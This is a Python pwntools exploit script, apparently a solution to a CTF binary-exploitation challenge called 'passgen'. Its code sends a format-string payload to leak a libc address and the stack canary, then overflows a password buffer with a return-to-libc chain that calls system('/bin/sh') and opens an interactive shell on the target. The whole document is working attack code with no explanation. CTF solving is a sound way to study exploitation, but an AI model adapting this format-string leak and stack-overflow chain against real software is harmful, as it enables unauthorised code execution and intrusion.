#!/usr/bin/env python3

# type: ignore
# flake8: noqa

import os

from pwn import *

elf = context.binary = ELF("./main_patched")
libc = ELF("./libc.so.6")


def start(argv=[], *a, **kw):
    # nc passgen.sibersiaga2023.myctf.io 9999
    host = args.HOST or 'passgen.sibersiaga2023.myctf.io'
    port = int(args.PORT or 9999)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}

io = start()
payload = b"%3$p|%11$p"
io.sendlineafter(b"name : ", payload)
io.recvline()
leak = io.recvline(keepends=False).split(b"|")
libc_leak = int(leak[0], 16)
libc.address = libc_leak - 0x110104
canary = int(leak[1], 16)
log.info(f"{libc.address=:#x}")
log.info(f"{canary=:#x}")

pop_rdi = 0x000000000002164f + libc.address
ret = 0x00000000000008aa + libc.address
bin_sh_string = next(libc.search(b"/bin/sh\x00"))

pad = 0x28
payload = b"A" * pad
payload += p64(canary)
payload += p64(elf.bss(0x400))
payload += flat(pop_rdi, bin_sh_string, ret, libc.symbols["system"])
io.sendlineafter(b"password = ", payload)
io.interactive()